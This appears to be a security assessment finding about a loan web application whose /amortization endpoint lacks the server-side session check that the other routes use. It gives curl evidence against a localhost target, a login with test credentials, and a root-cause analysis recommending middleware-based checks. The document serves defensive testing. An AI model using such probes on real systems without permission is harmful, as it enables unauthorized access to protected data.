The following evidence proves unauthorized access to authenticated functionality:

**Evidence 1 - Vulnerable Endpoint Accessible Without Authentication:**
```
$ curl -i 'http://localhost:37579/amortization?term=5'
HTTP/1.1 200 OK
Date: Fri, 31 Oct 2025 14:09:16 GMT
Server: Apache/2.4.65 (Debian)
Content-Length: 1598
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amortization Table</title>
    <i>This feature is not yet fully implented.</i>
    ...
</head>
<body>
    <h2>Amortization Table</h2>
    <table id="paymentTable">
        <thead>
            <tr>
                <th>Payment Number</th>
                <th>Principal</th>
                <th>Interest</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td>1</td>
                <td>N/A</td>
                <td>N/A</td>
            </tr>
            ...
        </tbody>
    </table>
</body>
</html>
```

**Evidence 2 - Protected Endpoints Properly Enforce Authentication:**
```
$ curl -i 'http://localhost:37579/home'
HTTP/1.1 302 FOUND
Date: Fri, 31 Oct 2025 14:09:25 GMT
Server: Apache/2.4.65 (Debian)
Location: /login
Content-Type: text/html; charset=utf-8

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
```

**Evidence 3 - Endpoint Intended to be Authenticated-Only:**

The `/amortization` endpoint is embedded in the authenticated `/loan_details` page (which requires valid session):

```bash
# Login with test credentials and access loan_details page
curl -c /tmp/cookies.txt -d "username=test&password=test" 'http://localhost:37579/login' -L
curl -b /tmp/cookies.txt 'http://localhost:37579/loan_details'
```

The `/loan_details` page contains:
```html
<!-- Button to trigger loading of amortization table in iframe -->
<button id="showAmortizationTable" class="btn btn-primary">Show Amortization Table</button>
<iframe id="amortizationIframe" src="" style="width: 100%; height: 500px; border: none;"></iframe>

<script>
$('#showAmortizationTable').click(function() {
    // Set the iframe src attribute to the /amortization endpoint
    $('#amortizationIframe').attr('src', '/amortization?term=60');
});
</script>
```

This proves the endpoint was designed to be accessed only from authenticated context (within iframe on authenticated page), but the server-side authentication check was missing.

**Root Cause Analysis:**

All other protected endpoints in the application implement inline session validation using this pattern (routes.py):
```python
user_id = session.get('user_id')
if user_id:
    # authorized code
else:
    return redirect(url_for('login'))
```

This pattern appears at:
- Line 49 (`/home` endpoint)
- Line 61 (`/profile` endpoint)
- Line 85 (`/loan_details` endpoint)
- Line 98 (`/total_loan_payments` endpoint)

However, the `/amortization` endpoint (line 122-177) **completely lacks this authentication check**. The function begins processing the `term` parameter immediately without validating session state.

The developers incorrectly assumed that embedding the endpoint in an iframe within an authenticated page provided sufficient security (security through obscurity). They failed to implement defense-in-depth by adding explicit server-side authentication validation to the embedded endpoint itself.

**Notes:**

This authorization vulnerability represents a **Context-Based Authorization Failure** where:
1. The application relied on the embedding context (iframe in authenticated page) for security
2. No server-side enforcement of the authentication requirement was implemented
3. Direct HTTP requests bypass the intended authentication workflow completely

The vulnerability demonstrates the danger of decentralized inline authentication checks rather than using middleware or decorators. The consistent authentication pattern was manually implemented in 4 endpoints but forgotten in this one, highlighting the fragility of this approach.

From a security architecture perspective, this is a violation of the defense-in-depth principle: every endpoint that should require authentication must explicitly validate authentication server-side, regardless of how it's intended to be accessed client-side.

---
